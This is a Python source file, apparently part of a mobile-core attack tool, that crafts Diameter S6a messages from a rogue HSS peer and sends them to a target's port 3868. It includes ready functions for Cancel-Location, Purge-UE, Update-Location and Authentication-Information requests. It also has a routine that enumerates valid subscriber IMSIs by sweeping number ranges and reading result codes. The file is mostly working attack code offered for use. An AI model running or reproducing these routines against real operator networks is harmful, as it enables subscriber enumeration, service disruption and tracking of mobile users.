import struct
import socket
import logging
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import IntEnum
import time
 
logger = logging.getLogger(__name__)

class DiameterCommandCode(IntEnum):
    CAPABILITIES_EXCHANGE = 257
    DEVICE_WATCHDOG = 280
    DISCONNECT_PEER = 282
    AUTHENTICATION_INFORMATION = 318
    UPDATE_LOCATION = 316
    CANCEL_LOCATION = 317
    INSERT_SUBSCRIBER_DATA = 319
    DELETE_SUBSCRIBER_DATA = 320
    PURGE_UE = 321
    NOTIFY = 323
    AUTHENTICATION_AUTHORIZATION = 265
    SESSION_TERMINATION = 275
    ABORT_SESSION = 274
    RE_AUTH = 258
    CREDIT_CONTROL = 272

class DiameterApplicationId(IntEnum):
    COMMON_MESSAGES = 0
    NASREQ = 1
    MOBILE_IPV4 = 2
    BASE_ACCOUNTING = 3
    CREDIT_CONTROL = 4
    EAP = 5
    SWX = 16777265
    S6A_S6D = 16777251
    SH = 16777217
    CX = 16777216
    GX = 16777238
    RX = 16777236
    SY = 16777302

class DiameterAVPCode(IntEnum):
    USER_NAME = 1
    HOST_IP_ADDRESS = 257
    AUTH_APPLICATION_ID = 258
    VENDOR_SPECIFIC_APPLICATION_ID = 260
    SESSION_ID = 263
    ORIGIN_HOST = 264
    ORIGIN_REALM = 296
    DESTINATION_HOST = 293
    DESTINATION_REALM = 283
    RESULT_CODE = 268
    EXPERIMENTAL_RESULT = 297
    EXPERIMENTAL_RESULT_CODE = 298
    AUTH_SESSION_STATE = 277
    VENDOR_ID = 266
    PRODUCT_NAME = 269
    ORIGIN_STATE_ID = 278
    SUPPORTED_VENDOR_ID = 265
    FIRMWARE_REVISION = 267
    VISITED_PLMN_ID = 1407
    RAT_TYPE = 1032
    ULR_FLAGS = 1405
    ULA_FLAGS = 1406
    SUBSCRIBER_STATUS = 1424
    MSISDN = 701
    STR_FLAGS = 1421
    IDA_FLAGS = 1441
    IMSI = 1
    REQUESTED_EUTRAN_AUTHENTICATION_INFO = 1408
    REQUESTED_UTRAN_GERAN_AUTHENTICATION_INFO = 1409
    NUMBER_OF_REQUESTED_VECTORS = 1410
    IMMEDIATE_RESPONSE_PREFERRED = 1412
    AUTHENTICATION_INFO = 1413
    E_UTRAN_VECTOR = 1414
    RAND = 1447
    XRES = 1448
    AUTN = 1449
    KASME = 1450

class DiameterResultCode(IntEnum):
    DIAMETER_SUCCESS = 2001
    DIAMETER_COMMAND_UNSUPPORTED = 3001
    DIAMETER_UNABLE_TO_DELIVER = 3002
    DIAMETER_REALM_NOT_SERVED = 3003
    DIAMETER_TOO_BUSY = 3004
    DIAMETER_LOOP_DETECTED = 3005
    DIAMETER_REDIRECT_INDICATION = 3006
    DIAMETER_APPLICATION_UNSUPPORTED = 3007
    DIAMETER_INVALID_AVP_VALUE = 5004
    DIAMETER_MISSING_AVP = 5005
    DIAMETER_RESOURCES_EXCEEDED = 5006
    DIAMETER_AUTHENTICATION_REJECTED = 4001
    DIAMETER_ERROR_USER_UNKNOWN = 5001
    DIAMETER_ERROR_ROAMING_NOT_ALLOWED = 5004
    DIAMETER_ERROR_UNKNOWN_EPS_SUBSCRIPTION = 5420
    DIAMETER_ERROR_RAT_NOT_ALLOWED = 5421

VENDOR_3GPP = 10415

@dataclass
class DiameterAVP:
    code: int
    flags: int = 0
    vendor_id: Optional[int] = None
    data: bytes = b''
    
    def encode(self) -> bytes:
        avp = struct.pack(">I", self.code)
        
        flags = self.flags
        if self.vendor_id is not None:
            flags |= 0x80
        
        data_len = len(self.data)
        if self.vendor_id is not None:
            avp_len = 12 + data_len
        else:
            avp_len = 8 + data_len
        
        avp += struct.pack(">BBH", flags, (avp_len >> 16) & 0xFF, avp_len & 0xFFFF)
        
        if self.vendor_id is not None:
            avp += struct.pack(">I", self.vendor_id)
        
        avp += self.data
        
        padding = (4 - (len(avp) % 4)) % 4
        avp += b'\x00' * padding
        
        return avp

@dataclass
class DiameterMessage:
    command_code: int
    application_id: int
    hop_by_hop_id: int = 0
    end_to_end_id: int = 0
    is_request: bool = True
    is_proxyable: bool = True
    is_error: bool = False
    is_retransmitted: bool = False
    avps: List[DiameterAVP] = field(default_factory=list)
    
    def encode(self) -> bytes:
        avp_data = b''.join(avp.encode() for avp in self.avps)
        
        msg_length = 20 + len(avp_data)
        
        flags = 0
        if self.is_request:
            flags |= 0x80
        if self.is_proxyable:
            flags |= 0x40
        if self.is_error:
            flags |= 0x20
        if self.is_retransmitted:
            flags |= 0x10
        
        header = struct.pack(">BBHI", 0x01, msg_length >> 16, msg_length & 0xFFFF, (flags << 24) | self.command_code)
        header += struct.pack(">I", self.application_id)
        header += struct.pack(">I", self.hop_by_hop_id)
        header += struct.pack(">I", self.end_to_end_id)
        
        return header + avp_data

class DiameterProtocol:
    DIAMETER_PORT = 3868
    
    def __init__(self, origin_host: str = "rogue.hss.local", origin_realm: str = "hss.local"):
        self.origin_host = origin_host
        self.origin_realm = origin_realm
        self.hop_by_hop_counter = 1
        self.end_to_end_counter = int(time.time()) << 20
        
    def _get_hop_by_hop_id(self) -> int:
        self.hop_by_hop_counter += 1
        return self.hop_by_hop_counter
    
    def _get_end_to_end_id(self) -> int:
        self.end_to_end_counter += 1
        return self.end_to_end_counter
    
    def _create_string_avp(self, code: int, value: str, mandatory: bool = True, vendor_id: Optional[int] = None) -> DiameterAVP:
        flags = 0x40 if mandatory else 0x00
        return DiameterAVP(code=code, flags=flags, vendor_id=vendor_id, data=value.encode('utf-8'))
    
    def _create_unsigned32_avp(self, code: int, value: int, mandatory: bool = True, vendor_id: Optional[int] = None) -> DiameterAVP:
        flags = 0x40 if mandatory else 0x00
        return DiameterAVP(code=code, flags=flags, vendor_id=vendor_id, data=struct.pack(">I", value))
    
    def _create_address_avp(self, code: int, ip_address: str, mandatory: bool = True) -> DiameterAVP:
        flags = 0x40 if mandatory else 0x00
        parts = [int(x) for x in ip_address.split('.')]
        data = struct.pack(">H", 1) + bytes(parts)
        return DiameterAVP(code=code, flags=flags, data=data)
    
    def craft_cer(self, host_ip: str = "192.168.1.100") -> bytes:
        msg = DiameterMessage(
            command_code=DiameterCommandCode.CAPABILITIES_EXCHANGE,
            application_id=DiameterApplicationId.COMMON_MESSAGES,
            hop_by_hop_id=self._get_hop_by_hop_id(),
            end_to_end_id=self._get_end_to_end_id(),
            is_request=True
        )
        
        msg.avps.append(self._create_string_avp(DiameterAVPCode.ORIGIN_HOST, self.origin_host))
        msg.avps.append(self._create_string_avp(DiameterAVPCode.ORIGIN_REALM, self.origin_realm))
        msg.avps.append(self._create_address_avp(DiameterAVPCode.HOST_IP_ADDRESS, host_ip))
        msg.avps.append(self._create_unsigned32_avp(DiameterAVPCode.VENDOR_ID, VENDOR_3GPP))
        msg.avps.append(self._create_string_avp(DiameterAVPCode.PRODUCT_NAME, "5G-Gibbon-Diameter", mandatory=False))
        msg.avps.append(self._create_unsigned32_avp(DiameterAVPCode.ORIGIN_STATE_ID, int(time.time())))
        msg.avps.append(self._create_unsigned32_avp(DiameterAVPCode.SUPPORTED_VENDOR_ID, VENDOR_3GPP))
        msg.avps.append(self._create_unsigned32_avp(DiameterAVPCode.AUTH_APPLICATION_ID, DiameterApplicationId.S6A_S6D))
        msg.avps.append(self._create_unsigned32_avp(DiameterAVPCode.FIRMWARE_REVISION, 1, mandatory=False))
        
        return msg.encode()
    
    def craft_dwr(self) -> bytes:
        msg = DiameterMessage(
            command_code=DiameterCommandCode.DEVICE_WATCHDOG,
            application_id=DiameterApplicationId.COMMON_MESSAGES,
            hop_by_hop_id=self._get_hop_by_hop_id(),
            end_to_end_id=self._get_end_to_end_id(),
            is_request=True
        )
        
        msg.avps.append(self._create_string_avp(DiameterAVPCode.ORIGIN_HOST, self.origin_host))
        msg.avps.append(self._create_string_avp(DiameterAVPCode.ORIGIN_REALM, self.origin_realm))
        msg.avps.append(self._create_unsigned32_avp(DiameterAVPCode.ORIGIN_STATE_ID, int(time.time())))
        
        return msg.encode()
    
    def craft_ulr(self, imsi: str, visited_plmn: bytes = b'\x00\xf1\x10', destination_host: Optional[str] = None, destination_realm: Optional[str] = None) -> bytes:
        msg = DiameterMessage(
            command_code=DiameterCommandCode.UPDATE_LOCATION,
            application_id=DiameterApplicationId.S6A_S6D,
            hop_by_hop_id=self._get_hop_by_hop_id(),
            end_to_end_id=self._get_end_to_end_id(),
            is_request=True
        )
        
        session_id = f"{self.origin_host};{int(time.time())};{self.hop_by_hop_counter}"
        msg.avps.append(self._create_string_avp(DiameterAVPCode.SESSION_ID, session_id))
        
        msg.avps.append(self._create_unsigned32_avp(DiameterAVPCode.AUTH_SESSION_STATE, 1))
        msg.avps.append(self._create_string_avp(DiameterAVPCode.ORIGIN_HOST, self.origin_host))
        msg.avps.append(self._create_string_avp(DiameterAVPCode.ORIGIN_REALM, self.origin_realm))
        
        if destination_host:
            msg.avps.append(self._create_string_avp(DiameterAVPCode.DESTINATION_HOST, destination_host))
        if destination_realm:
            msg.avps.append(self._create_string_avp(DiameterAVPCode.DESTINATION_REALM, destination_realm))
        
        msg.avps.append(self._create_string_avp(DiameterAVPCode.USER_NAME, imsi))
        
        msg.avps.append(DiameterAVP(
            code=DiameterAVPCode.VISITED_PLMN_ID,
            flags=0xC0,
            vendor_id=VENDOR_3GPP,
            data=visited_plmn
        ))
        
        msg.avps.append(self._create_unsigned32_avp(DiameterAVPCode.RAT_TYPE, 1004, vendor_id=VENDOR_3GPP))
        
        ulr_flags = 0x00000003
        msg.avps.append(self._create_unsigned32_avp(DiameterAVPCode.ULR_FLAGS, ulr_flags, vendor_id=VENDOR_3GPP))
        
        return msg.encode()
    
    def craft_air(self, imsi: str, visited_plmn: bytes = b'\x00\xf1\x10', num_vectors: int = 1, destination_host: Optional[str] = None, destination_realm: Optional[str] = None) -> bytes:
        msg = DiameterMessage(
            command_code=DiameterCommandCode.AUTHENTICATION_INFORMATION,
            application_id=DiameterApplicationId.S6A_S6D,
            hop_by_hop_id=self._get_hop_by_hop_id(),
            end_to_end_id=self._get_end_to_end_id(),
            is_request=True
        )
        
        session_id = f"{self.origin_host};{int(time.time())};{self.hop_by_hop_counter}"
        msg.avps.append(self._create_string_avp(DiameterAVPCode.SESSION_ID, session_id))
        
        msg.avps.append(self._create_unsigned32_avp(DiameterAVPCode.AUTH_SESSION_STATE, 1))
        msg.avps.append(self._create_string_avp(DiameterAVPCode.ORIGIN_HOST, self.origin_host))
        msg.avps.append(self._create_string_avp(DiameterAVPCode.ORIGIN_REALM, self.origin_realm))
        
        if destination_host:
            msg.avps.append(self._create_string_avp(DiameterAVPCode.DESTINATION_HOST, destination_host))
        if destination_realm:
            msg.avps.append(self._create_string_avp(DiameterAVPCode.DESTINATION_REALM, destination_realm))
        
        msg.avps.append(self._create_string_avp(DiameterAVPCode.USER_NAME, imsi))
        
        msg.avps.append(DiameterAVP(
            code=DiameterAVPCode.VISITED_PLMN_ID,
            flags=0xC0,
            vendor_id=VENDOR_3GPP,
            data=visited_plmn
        ))
        
        req_eutran = DiameterAVP(
            code=DiameterAVPCode.REQUESTED_EUTRAN_AUTHENTICATION_INFO,
            flags=0xC0,
            vendor_id=VENDOR_3GPP,
            data=struct.pack(">I", num_vectors)
        )
        msg.avps.append(req_eutran)
        
        return msg.encode()
    
    def craft_clr(self, imsi: str, cancellation_type: int = 0, destination_host: Optional[str] = None, destination_realm: Optional[str] = None) -> bytes:
        msg = DiameterMessage(
            command_code=DiameterCommandCode.CANCEL_LOCATION,
            application_id=DiameterApplicationId.S6A_S6D,
            hop_by_hop_id=self._get_hop_by_hop_id(),
            end_to_end_id=self._get_end_to_end_id(),
            is_request=True
        )
        
        session_id = f"{self.origin_host};{int(time.time())};{self.hop_by_hop_counter}"
        msg.avps.append(self._create_string_avp(DiameterAVPCode.SESSION_ID, session_id))
        
        msg.avps.append(self._create_unsigned32_avp(DiameterAVPCode.AUTH_SESSION_STATE, 1))
        msg.avps.append(self._create_string_avp(DiameterAVPCode.ORIGIN_HOST, self.origin_host))
        msg.avps.append(self._create_string_avp(DiameterAVPCode.ORIGIN_REALM, self.origin_realm))
        
        if destination_host:
            msg.avps.append(self._create_string_avp(DiameterAVPCode.DESTINATION_HOST, destination_host))
        if destination_realm:
            msg.avps.append(self._create_string_avp(DiameterAVPCode.DESTINATION_REALM, destination_realm))
        
        msg.avps.append(self._create_string_avp(DiameterAVPCode.USER_NAME, imsi))
        
        msg.avps.append(self._create_unsigned32_avp(1400, cancellation_type, vendor_id=VENDOR_3GPP))
        
        return msg.encode()
    
    def craft_pur(self, imsi: str, destination_host: Optional[str] = None, destination_realm: Optional[str] = None) -> bytes:
        msg = DiameterMessage(
            command_code=DiameterCommandCode.PURGE_UE,
            application_id=DiameterApplicationId.S6A_S6D,
            hop_by_hop_id=self._get_hop_by_hop_id(),
            end_to_end_id=self._get_end_to_end_id(),
            is_request=True
        )
        
        session_id = f"{self.origin_host};{int(time.time())};{self.hop_by_hop_counter}"
        msg.avps.append(self._create_string_avp(DiameterAVPCode.SESSION_ID, session_id))
        
        msg.avps.append(self._create_unsigned32_avp(DiameterAVPCode.AUTH_SESSION_STATE, 1))
        msg.avps.append(self._create_string_avp(DiameterAVPCode.ORIGIN_HOST, self.origin_host))
        msg.avps.append(self._create_string_avp(DiameterAVPCode.ORIGIN_REALM, self.origin_realm))
        
        if destination_host:
            msg.avps.append(self._create_string_avp(DiameterAVPCode.DESTINATION_HOST, destination_host))
        if destination_realm:
            msg.avps.append(self._create_string_avp(DiameterAVPCode.DESTINATION_REALM, destination_realm))
        
        msg.avps.append(self._create_string_avp(DiameterAVPCode.USER_NAME, imsi))
        
        return msg.encode()
    
    def parse_diameter_message(self, data: bytes) -> Optional[Dict[str, Any]]:
        if len(data) < 20:
            return None
        
        try:
            version = data[0]
            msg_length = (data[1] << 16) | (data[2] << 8) | data[3]
            flags = data[4]
            command_code = (data[5] << 16) | (data[6] << 8) | data[7]
            application_id = struct.unpack(">I", data[8:12])[0]
            hop_by_hop_id = struct.unpack(">I", data[12:16])[0]
            end_to_end_id = struct.unpack(">I", data[16:20])[0]
            
            is_request = bool(flags & 0x80)
            is_proxyable = bool(flags & 0x40)
            is_error = bool(flags & 0x20)
            is_retransmitted = bool(flags & 0x10)
            
            avps = []
            offset = 20
            while offset < len(data):
                if offset + 8 > len(data):
                    break
                
                avp_code = struct.unpack(">I", data[offset:offset+4])[0]
                avp_flags = data[offset+4]
                avp_length = (data[offset+5] << 16) | (data[offset+6] << 8) | data[offset+7]
                
                has_vendor = bool(avp_flags & 0x80)
                
                if has_vendor:
                    vendor_id = struct.unpack(">I", data[offset+8:offset+12])[0]
                    avp_data = data[offset+12:offset+avp_length]
                else:
                    vendor_id = None
                    avp_data = data[offset+8:offset+avp_length]
                
                avps.append({
                    "code": avp_code,
                    "flags": avp_flags,
                    "vendor_id": vendor_id,
                    "data": avp_data
                })
                
                padded_length = avp_length + (4 - (avp_length % 4)) % 4
                offset += padded_length
            
            return {
                "version": version,
                "length": msg_length,
                "command_code": command_code,
                "application_id": application_id,
                "hop_by_hop_id": hop_by_hop_id,
                "end_to_end_id": end_to_end_id,
                "is_request": is_request,
                "is_proxyable": is_proxyable,
                "is_error": is_error,
                "is_retransmitted": is_retransmitted,
                "avps": avps
            }
        except Exception as e:
            logger.error(f"Failed to parse Diameter message: {e}")
            return None
    
    def send_diameter_message(self, target_ip: str, message: bytes, timeout: float = 5.0) -> Optional[bytes]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target_ip, self.DIAMETER_PORT))
            
            sock.send(message)
            
            response = sock.recv(8192)
            sock.close()
            
            return response
        except socket.timeout:
            logger.warning(f"Timeout sending Diameter message to {target_ip}")
            return None
        except Exception as e:
            logger.error(f"Error sending Diameter message: {e}")
            return None
    
    def send_diameter_message_with_status(self, target_ip: str, message: bytes, timeout: float = 5.0) -> Tuple[bool, Optional[bytes], Optional[str]]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target_ip, self.DIAMETER_PORT))
            
            sock.send(message)
            
            response = sock.recv(8192)
            sock.close()
            
            return (True, response, None)
        except socket.timeout:
            return (False, None, f"Timeout connecting to {target_ip}:{self.DIAMETER_PORT}")
        except socket.error as e:
            return (False, None, f"Socket error: {e}")
        except Exception as e:
            return (False, None, f"Error: {e}")
    
    def encode_visited_plmn(self, mcc: str, mnc: str) -> Tuple[bytes, str]:
        mcc_digits = [int(d) for d in mcc.zfill(3)]
        mnc_digits = [int(d) for d in mnc.zfill(3)]
        plmn = bytes([
            (mcc_digits[1] << 4) | mcc_digits[0],
            (mnc_digits[2] << 4) | mcc_digits[2],
            (mnc_digits[1] << 4) | mnc_digits[0]
        ])
        plmn_str = f"{mcc}-{mnc}"
        return (plmn, plmn_str)


def test_diameter_connection(hss_ip: str, host_ip: str = "192.168.1.100") -> Dict[str, Any]:
    logger.info(f"Testing Diameter connection to HSS: {hss_ip}")
    
    diameter = DiameterProtocol()
    
    cer = diameter.craft_cer(host_ip=host_ip)
    
    logger.info(f"Crafted CER: {len(cer)} bytes")
    
    result = {
        "target": hss_ip,
        "message_type": "CER",
        "message_size": len(cer),
        "response": None,
        "success": False,
        "peer_info": None
    }
    
    response = diameter.send_diameter_message(hss_ip, cer)
    
    if response:
        result["response"] = response.hex()[:200] + "..." if len(response.hex()) > 200 else response.hex()
        parsed = diameter.parse_diameter_message(response)
        if parsed:
            result["success"] = not parsed["is_error"]
            result["peer_info"] = {
                "command_code": parsed["command_code"],
                "application_id": parsed["application_id"],
                "is_error": parsed["is_error"]
            }
    
    return result


def test_subscriber_lookup(hss_ip: str, imsi: str, destination_realm: str = "epc.mnc001.mcc001.3gppnetwork.org") -> Dict[str, Any]:
    logger.info(f"Testing subscriber lookup for IMSI {imsi} on HSS {hss_ip}")
    
    diameter = DiameterProtocol()
    
    air = diameter.craft_air(
        imsi=imsi,
        num_vectors=1,
        destination_realm=destination_realm
    )
    
    result = {
        "target": hss_ip,
        "imsi": imsi,
        "message_type": "AIR",
        "message_size": len(air),
        "response": None,
        "success": False,
        "subscriber_exists": None
    }
    
    response = diameter.send_diameter_message(hss_ip, air)
    
    if response:
        parsed = diameter.parse_diameter_message(response)
        if parsed:
            result_code = None
            for avp in parsed["avps"]:
                if avp["code"] == DiameterAVPCode.RESULT_CODE:
                    result_code = struct.unpack(">I", avp["data"])[0] if len(avp["data"]) >= 4 else None
                    break
            
            if result_code:
                result["result_code"] = result_code
                result["success"] = result_code == DiameterResultCode.DIAMETER_SUCCESS
                result["subscriber_exists"] = result_code != DiameterResultCode.DIAMETER_ERROR_USER_UNKNOWN
    
    return result


def enumerate_imsis(hss_ip: str, mcc: str = "001", mnc: str = "01", start: int = 1000000000, count: int = 10) -> Dict[str, Any]:
    logger.info(f"Enumerating IMSIs on HSS {hss_ip}: {mcc}{mnc}{start} - {mcc}{mnc}{start+count-1}")
    
    diameter = DiameterProtocol()
    valid_imsis = []
    
    for i in range(count):
        imsi = f"{mcc}{mnc}{start + i:010d}"
        
        air = diameter.craft_air(imsi=imsi, num_vectors=1)
        response = diameter.send_diameter_message(hss_ip, air, timeout=2.0)
        
        if response:
            parsed = diameter.parse_diameter_message(response)
            if parsed:
                result_code = None
                for avp in parsed["avps"]:
                    if avp["code"] == DiameterAVPCode.RESULT_CODE:
                        result_code = struct.unpack(">I", avp["data"])[0] if len(avp["data"]) >= 4 else None
                        break
                
                if result_code and result_code != DiameterResultCode.DIAMETER_ERROR_USER_UNKNOWN:
                    valid_imsis.append(imsi)
                    logger.info(f"  Valid IMSI found: {imsi}")
    
    return {
        "target": hss_ip,
        "range": f"{mcc}{mnc}{start} - {mcc}{mnc}{start+count-1}",
        "valid_imsis": valid_imsis,
        "count": len(valid_imsis)
    }

